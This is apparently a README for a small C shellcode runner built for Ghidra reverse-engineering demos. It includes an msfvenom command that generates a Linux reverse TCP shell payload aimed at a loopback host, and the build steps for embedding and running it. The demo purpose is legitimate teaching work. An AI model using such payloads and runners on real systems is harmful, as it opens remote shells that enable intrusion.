# Simple_ELF_Shellcode_Runner
Just a simple ELF shellcode runner to use for Ghidra demos.


## How to build
0. Generate a payload with ```msfvenom``` or shellcode generator of your choice.
```
msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=127.0.0.1 -f c
```
1. Update the payload and sczsize variables.

2. Build the payload via ```make```

### References
* [Executing Shellcode in C](https://tuttlem.github.io/2017/10/28/executing-shellcode-in-c.html)
* [Creating and Testing x86_64 shellcode on a Linux Machine](https://stackoverflow.com/questions/27900201/create-and-test-x86-64-elf-executable-shellcode-on-a-linux-machine)
* [mprotect](https://man7.org/linux/man-pages/man2/mprotect.2.html)
